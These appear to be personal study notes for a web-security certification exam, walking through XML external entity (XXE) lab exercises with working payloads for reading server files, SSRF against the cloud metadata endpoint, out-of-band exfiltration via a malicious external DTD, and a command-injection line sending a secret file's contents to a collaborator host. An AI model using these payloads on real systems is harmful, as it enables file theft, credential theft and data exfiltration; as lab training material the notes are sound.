## Stage 3
### What is it?
XML external entity injection is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem. Can leverage XXE to perform server-side request forgery (SSRF) attacks. *It's possible to find XXE in requests that do not contain XML*.

### Look for
- XML in request body like `<?xml version="1.0" encoding="UTF-8"?>`
- Burp scan results: XML Injection
- File upload feature

### Identify Vulnerabilities in Exam
Check stock, submit feedback
Try the payload below to test for XXE
```
%26entity;
```
![XXE-20260222113339962](XXE-20260222113339962.png)


- XML in `POST /product/stock`
```
<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> 
<stockCheck><productId>&xxe;</productId>
```
- -
	- Show `/etc/passwd` content
		- <sup>Scan result: YES</sup> [XXE](XXE.md#3.1.%20Lab%20Exploiting%20XXE%20using%20external%20entities%20to%20retrieve%20files%20%E2%AD%95%EF%B8%8F)
		- <sup>Scan result: YES</sup>[XXE](XXE.md#3.2.%20Lab%20Exploiting%20XXE%20to%20perform%20SSRF%20attacks%20%E2%AD%95%EF%B8%8F)
	- "Invalid product ID"
		- <sup>Scan result: YES</sup>[XXE](XXE.md#3.3.%20Lab%20Blind%20XXE%20with%20out-of-band%20interaction%20%E2%AD%95%EF%B8%8F)
	- "Entities are not allowed for security reasons"
		- [XXE](XXE.md#3.4.%20Lab%20Blind%20XXE%20with%20out-of-band%20interaction%20via%20XML%20parameter%20entities%20%E2%AD%95%EF%B8%8F)
- **No** XML in `POST /product/stock`
	- <sup>Scan result: YES</sup>[XXE](XXE.md#3.7.%20Lab%20Exploiting%20XInclude%20to%20retrieve%20files%20%E2%AD%95%EF%B8%8F)

- XML in `POST /product/stock`
	- *Use payload above* = "Entities are not allowed for security reasons"
		- [XXE](XXE.md#3.5.%20Lab%20Exploiting%20blind%20XXE%20to%20exfiltrate%20data%20using%20a%20malicious%20external%20DTD%20%E2%AD%95%EF%B8%8F)
		- [XXE](XXE.md#3.6.%20Lab%20Exploiting%20blind%20XXE%20to%20retrieve%20data%20via%20error%20messages%20%E2%AD%95%EF%B8%8F)

- `svg` in `<img>` tag + image upload feature
	-  ![XXE-20260113215511900](XXE-20260113215511900.png)
	- [XXE](XXE.md#3.8.%20Lab%20Exploiting%20XXE%20via%20image%20file%20upload%20%E2%AD%95%EF%B8%8F)





**Try the following and refer to this if true**: https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/tree/main?tab=readme-ov-file#sql--xml--hackvertor
```
# Request
<productId>
7*7
</productId>

# Response
"No such product or store"
```

#### Admin user import via XML
[![image](https://user-images.githubusercontent.com/58632878/225074086-5357aeac-a445-47d8-87e8-a472bf874f6d.png)](https://user-images.githubusercontent.com/58632878/225074086-5357aeac-a445-47d8-87e8-a472bf874f6d.png)

```
<?xml version="1.0" encoding="UTF-8"?>
<users>
    <user>
        <username>Example1</username>
        <email>example1@domain.com&`nslookup -q=cname $(cat /home/carlos/secret).burp.oastify.com`</email>
    </user>
</users>
```


---
#### 3.1. Lab: Exploiting XXE using external entities to retrieve files ⭕️
This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.
To solve the lab, inject an XML external entity to retrieve the contents of the `/etc/passwd` file.
1. Click on an item > Check stock > notice the request body uses XML.
2. Set up the request with the payload like in the screenshot > Send > solve.
![613](XXE-20260113202827930.png)
```
<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> <stockCheck><productId>&xxe;</productId>
```
##### Automated Method
1. Send the XML request to Intruder > add the values as positions > Start attack
	1. ![XXE-20260113202625302](XXE-20260113202625302.png)
	2. ![XXE-20260113202603493](XXE-20260113202603493.png)
>[!tip] How to Identify this Vulnerability?
>1. XML in the request body
>2. Or Burp scan

**Use in exam**
```
<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///home/carlos/secret"> ]> <stockCheck><productId>&xxe;</productId>
```

---
#### 3.2. Lab: Exploiting XXE to perform SSRF attacks ⭕️
#SSRF
This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is `http://169.254.169.254/`. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.

To solve the lab, exploit the XXE vulnerability to perform an SSRF attack that obtains the server's IAM secret access key from the EC2 metadata endpoint.
1. Select an item > Check stock > notice XML in the `POST /product/stock` request > Send to Repeater.
	1. ![XXE-20260113203208349](XXE-20260113203208349.png)
2. *Optional but recommended*: Use Burp scan -- scan insertion point
	1. ![XXE-20260113203320106](XXE-20260113203320106.png)
3. Paste in `<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>` and add `&xxe;` in `productId`. Notice the error: **Invalid product ID: latest**. `latest` is a directory.
	1. ![XXE-20260113203457706](XXE-20260113203457706.png)
4. Add `latest` in the request and now we see `meta-data`. Keep traversing until you find the secret access key.
	1. ![XXE-20260113203743267](XXE-20260113203743267.png)
	2. ![XXE-20260113203834377](XXE-20260113203834377.png)
>[!tip] How to Identify this Vulnerability?
>1. XML in the request body or Burp scan
>2. Response says something like `Invalid product ID: latest` and `latest` is a directory

---
#### 3.3. Lab: Blind XXE with out-of-band interaction ⭕️
This lab has a "Check stock" feature that parses XML input but does not display the result.

You can detect the blind XXE vulnerability by triggering out-of-band interactions with an external domain.

To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.
1. Click item > Check stock > `POST /product/stock` > notice XML > send to Repeater.
2. Insert `<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>` and add `&xxe;`.
	1. ![XXE-20260113204403326](XXE-20260113204403326.png)
3. Poll Collaborator and solved.
	1. ![XXE-20260113204427344](XXE-20260113204427344.png)
>[!tip] How to Identify this Vulnerability?
>1. XML in the request body or Burp scan

---
#### 3.4. Lab: Blind XXE with out-of-band interaction via XML parameter entities ⭕️
This lab has a "Check stock" feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities.

To solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.
1. Click item > Check stock > `POST /product/stock` > notice XML > send to Repeater.
2. If you try the same solution in the previous lab (Step 2), you will get a different error and nothing will show up in Collaborator. Error: **"Entities are not allowed for security reasons"**.
	1. ![XXE-20260113205110413](XXE-20260113205110413.png)
3. Use *Parameter Entities* to bypass this. Send the payload below and solve. Notice the `% xxe` and `%xxe;` at the end.
	1. ![XXE-20260113205557813](XXE-20260113205557813.png)
```
<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>
```

>[!tip] How to Identify this Vulnerability?
>1. XML in the request body
>2. Burp scan insertion point *WILL NOT* call out XML Injection 
>3. "Entities are not allowed for security reasons" error


```

```

---
#### 3.5. Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD ⭕️
This lab has a "Check stock" feature that parses XML input but does not display the result.
To solve the lab, exfiltrate the contents of the `/etc/hostname` file.
1. Click item > Check stock > `POST /product/stock` > notice XML > send to Repeater.
2. Exploit server > enter the following payload and click Store.
```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-DOMAIN/?x=%file;'>">
%eval;
%exfil;
```
3. Repeater > enter the payload below (ensure it's the exploit server url even with `https://` and `/exploit`). Send.
	1. ![XXE-20260113212848736](XXE-20260113212848736.png)
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "EXPLOIT-SERVER-FULL-URL"> %xxe;]>
```
4. Check Collaborator > HTTP request > and got the value of `file:///etc/hostname`. 
	1. ![XXE-20260113212931089](XXE-20260113212931089.png)

>If your exploit server full url has `/exploit.dtd` you have to reference it here: `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "DTD-URL"> %xxe;]>`

#ExamTip In the BSCP exam, might have to use these payloads:
```
# In Exploit Server body
<!ENTITY % file SYSTEM "file:///home/carlos/secret">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://OASTIFY.COM/?x=%file;'>">
%eval;
%exfil;

# In request
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE users [<!ENTITY % xxe SYSTEM "https://EXPLOIT.net/exploit.dtd"> %xxe;]>
<users>
    <user>
        <username>Carl Toyota</username>
        <email>carlos@hacked.net</email>
    </user>    
</users>
```

![Pasted image 20260222114111](Pasted%20image%2020260222114111.png)

>[!tip] How to Identify this Vulnerability?
>1. XML in the request body
>2. Able to get an out-of-band connection == got DNS + HTTP requests to Collaborator
>3. "XML parsing error" in the response

---
#### 3.6. Lab: Exploiting blind XXE to retrieve data via error messages ⭕️
This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, use an external DTD to trigger an error message that displays the contents of the `/etc/passwd` file.

The lab contains a link to an exploit server on a different domain where you can host your malicious DTD.
1. Click item > Check stock > `POST /product/stock` > notice XML > send to Repeater.
2. If we try exactly what we did in Lab 5 but replace the payload to get `/etc/passwd` we'll get this error: "XML parser exited with error: java.net.MalformedURLException: Illegal character in URL".
	1. ![XXE-20260113213745361](XXE-20260113213745361.png)
3. Enter this in the exploit server and Store. This is the crucial part: **`'file:///invalid/%file;'>">`**.
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```
4. Enter this in Repeater: `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://EXPLOIT.net/exploit"> %xxe;]>`. Replace it with your exploit server URL. Send and solve.
	1. **Exploit server: File should be /exploit**
		1. If /exploit doesn't work change to /exploit.dtd. Make sure to change the payload in step 3 to /exploit.dtd too.
	2. ![XXE-20260113214453965](XXE-20260113214453965.png)
>[!tip] How to Identify this Vulnerability?
>1. XML in the request body
>2. Able to get an out-of-band connection == got DNS + HTTP requests to Collaborator
>3. XML parser exited with error: java.net.MalformedURLException: Illegal character in URL" in the response


---
#### 3.7. Lab: Exploiting XInclude to retrieve files ⭕️
This lab has a "Check stock" feature that embeds the user input inside a server-side XML document that is subsequently parsed.

Because you don't control the entire XML document you can't define a DTD to launch a classic XXE attack.

To solve the lab, inject an `XInclude` statement to retrieve the contents of the `/etc/passwd` file.
1. Click item > Check stock > `POST /product/stock` > notice *NO* XML > send to Repeater.
2. Send to Intruder > add positions to both product and store values > Scan insertion points and we get an XML Injection finding.
	1. ![XXE-20260113214830294](XXE-20260113214830294.png)
	2. ![XXE-20260113214822301](XXE-20260113214822301.png)
3. Enter the below payload in the productId param, URL encode key characters, Send and solve.
	1. ![XXE-20260113215107940](XXE-20260113215107940.png)
```
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```
>[!tip] How to Identify this Vulnerability?
>1. *NO* XML in the request body
>2. Got XML Injection finding via Burp scan

**Use in exam -- payload is url encoded**
```
<foo+xmlns%3axi%3d"http%3a//www.w3.org/2001/XInclude"><xi%3ainclude+parse%3d"text"+href%3d"file%3a///home/carlos/secret"/></foo>
```


---
#### 3.8. Lab: Exploiting XXE via image file upload ⭕️
This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files.
To solve the lab, upload an image that displays the contents of the `/etc/hostname` file after processing. Then use the "Submit solution" button to submit the value of the server hostname.
1. Click on a blog post > View Page Source > identify the image extension: `svg`
	1. ![XXE-20260113215511900](XXE-20260113215511900.png)
2. Upload a random `svg` file and post comment (it might not work but we just want the `POST` request then send it to Repeater).
3. Replace the contents with this payload and Send.
```
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```
![Pasted image 20260222115523](Pasted%20image%2020260222115523.png)
4. The avatar image was uploaded and the comment was posted. View image in new tab and the contents on `/etc/hostname` is in there. Submit and solve.
	1. ![XXE-20260113220038408](XXE-20260113220038408.png)
	2. ![XXE-20260113220053081](XXE-20260113220053081.png)
>[!tip] How to Identify this Vulnerability?
>1. File upload feature

**Use in exam**
```
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///home/carlos/secret" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```


---
